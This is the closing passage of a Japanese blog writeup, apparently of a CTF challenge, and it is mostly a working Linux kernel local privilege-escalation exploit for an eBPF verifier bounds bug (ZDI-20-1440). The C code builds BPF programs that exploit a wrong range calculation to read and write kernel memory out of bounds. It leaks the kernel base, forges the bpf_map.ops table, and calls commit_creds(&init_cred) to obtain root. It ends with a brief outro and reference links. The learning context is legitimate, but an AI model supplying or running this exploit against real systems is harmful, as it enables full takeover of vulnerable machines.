    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                // qword[r2] = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 0)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),       // r6 = cmap[0] (==0)
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                // r9 = &cmap[0]
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                // r8 = &cmap[0]
    /* get cmap[1] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),                // qword[r2] = 1
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 1)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),       // r7 = cmap[1] (==1)
    /* fix r6/r7 range */
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 0, 2),              // ensure R6>=0
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 2, 1),              // ensure 0<=R6<=1
    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 0, 2),              // ensure R7>=0
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 2, 1),              // ensure 0<=R7<=1
    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    // exploit r6 range 
    BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_7),       // r6 >>= r7 (r6 regarded as 0, actually 1)
    BPF_ALU64_IMM(BPF_NEG, BPF_REG_6, 0),               // r6 *= -1
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, N),               // r6 *= N

    // load it malciously
    BPF_ALU64_REG(BPF_ADD, BPF_REG_9, BPF_REG_6),       // r9 += r6 (r9 = &cmap[0] + N)
    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_9, 0),       // r3 = qword [r9] (r3 = [&cmap[0] + N])
    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_3, 0),       // [r8] = r3 (cmap[0] = r9)
    // Go Home
    BPF_MOV64_IMM(BPF_REG_0, 0),                        // r0 = 0
    BPF_EXIT_INSN()
  };

  reader = create_filtered_socket_fd(reader_insns, ARRSIZE(reader_insns));
  if(reader < 0){
    errExit("reader not initialized");
  }
  array_update(control_map, 0, 1);
  array_update(control_map, 1, 0);
  trigger_proc(reader);
  const ulong tmp = get_ulong(control_map, 0);
  return tmp;
}

ulong leak_controlmap(void)
{
  struct bpf_insn reader_insns[] = {
    /* get cmap[0] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                // qword[r2] = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 0)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),       // r6 = cmap[0] (==0)
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                // r9 = &cmap[0]
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                // r8 = &cmap[0]

    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_8, 0),       // [r8] = r3 (cmap[0] = r9)
    // Go Home
    BPF_MOV64_IMM(BPF_REG_0, 0),                        // r0 = 0
    BPF_EXIT_INSN()
  };

  int tmp_reader = create_filtered_socket_fd(reader_insns, ARRSIZE(reader_insns));
  if(tmp_reader < 0){
    errExit("tmp_reader not initialized");
  }
  trigger_proc(tmp_reader);
  const ulong tmp = get_ulong(control_map, 0);
  return tmp;
}

void ops_NIRUGIRI(ulong controlmap_addr, ulong kernbase)
{
  const ulong fakeops_addr = controlmap_addr + 0x10;
  const ulong init_cred = kernbase + 0xE43E60;
  const ulong commit_creds = kernbase + 0x081E70;
  const uint N = 0x90;
  const uint zero = 0;
  printf("[.] init_cred: 0x%lx\n", (((init_cred>>32) & 0xFFFFFFFFUL)<<32) + (init_cred & 0xFFFFFFFFUL));

  struct bpf_insn writer_insns[] = {
    /* get cmap[0] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 0),                // qword[r2] = 0
    BPF_ST_MEM(BPF_DW, BPF_REG_2, -8, 0),
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 0)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),       // r6 = cmap[0] (==0)
    BPF_MOV64_REG(BPF_REG_9, BPF_REG_0),                // r9 = &cmap[0]
    BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),                // r8 = &cmap[0]
    /* get cmap[1] */
    BPF_LD_MAP_FD(BPF_REG_1, control_map),              // r1 = cmap
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),               // r2 = rbp
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -0x8),            // r2 -= 8
    BPF_ST_MEM(BPF_DW, BPF_REG_2, 0, 1),                // qword[r2] = 1
    BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),            // r0 = map_lookup_elem(cmap, 1)
    BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),              // jmp if r0!=0
    BPF_EXIT_INSN(),
    BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),       // r7 = cmap[1] (==1)
    /* fix r6/r7 range */
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 0, 2),              // ensure R6>=0
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_6, 2, 1),              // ensure 0<=R6<=1
    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 0, 2),              // ensure R7>=0
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    BPF_JMP_IMM(BPF_JSGE, BPF_REG_7, 2, 1),              // ensure 0<=R7<=1
    BPF_JMP_IMM(BPF_JA, 0, 0, 2),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
    // exploit r6 range 
    BPF_ALU64_REG(BPF_RSH, BPF_REG_6, BPF_REG_7),       // r6 >>= r7 (r6 regarded as 0, actually 1)
    BPF_ALU64_IMM(BPF_NEG, BPF_REG_6, 0),               // r6 *= -1
    // overwrite ops into forged ops
    BPF_MOV64_IMM(BPF_REG_1, (fakeops_addr>>32) & 0xFFFFFFFFUL),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, fakeops_addr & 0xFFFFFFFFUL),
    BPF_ALU64_IMM(BPF_MUL, BPF_REG_6, N),
    BPF_ALU64_REG(BPF_ADD, BPF_REG_8, BPF_REG_6),       // r8 += r6
    BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_1, 0),
    // forge ptrs[0] with &init_cred
    BPF_MOV64_IMM(BPF_REG_2, 0),
    BPF_MOV64_IMM(BPF_REG_3, init_cred & 0xFFFFFFFFUL),
    BPF_ALU64_IMM(BPF_LSH, BPF_REG_3, 32),
    BPF_ALU64_IMM(BPF_ARSH, BPF_REG_3, 32),
    BPF_ALU64_REG(BPF_ADD, BPF_REG_2, BPF_REG_3),
    BPF_STX_MEM(BPF_DW, BPF_REG_9, BPF_REG_2, 0),
    
    // Go Home
    BPF_MOV64_IMM(BPF_REG_0, 0),                        // r0 = 0
    BPF_EXIT_INSN()
  };

  int evilwriter= create_filtered_socket_fd(writer_insns, ARRSIZE(writer_insns));
  if(evilwriter < 0){
    errExit("reader not initialized");
  }

  // setup fake table
  for(int ix=0; ix!=10; ++ix){
    array_update(control_map, ix+2, commit_creds);
  }
  array_update(control_map, 6, kernbase + 0x12B730);  // fd_array_map_delete_elem

  // overwrite bpf_map.ops
  array_update(control_map, 0, 1);
  array_update(control_map, 1, 0);
  trigger_proc(evilwriter);

  // NIRUGIRI
  union bpf_attr lookup_map_attrs = {
    .map_fd = control_map,
    .key = (uint64_t)&zero,
  };
  bpf_(BPF_MAP_LOOKUP_ELEM, &lookup_map_attrs);
  NIRUGIRI();
  printf("[-] press ENTER to die\n");
  WAIT;
}

int main(int argc, char *argv[]) {
  control_map = array_create(0x8, 0x10); // [0] always 1, [1] always 0

  // leak kernbase
  const ulong kernbase = read_rel(0x90) - 0xA12100;
  printf("[+] kernbase: 0x%lx\n", kernbase);

  // leak controlmap's addr
  const ulong controlmap_addr = leak_controlmap();
  printf("[+] controlmap: 0x%lx\n", controlmap_addr);

  // forge bpf_map.ops and do commit_creds(&init_cred)
  ops_NIRUGIRI(controlmap_addr, kernbase);

  return 0; // unreachable
}
```

# アウトロ
最初は権限ゆるすぎてどうなんだろうと思ってたけど、`bpf_map.btf`なしでROOT取る流れを考えるのは楽しかったです。
もうすぐ春ですね。海を見に行きたいです。


# 参考
author's writeup
https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/
original 0-day blog
https://www.thezdi.com/blog/2021/1/18/zdi-20-1440-an-incorrect-calculation-bug-in-the-linux-kernel-ebpf-verifier
ニルギリ
https://youtu.be/yvUvamhYPHw
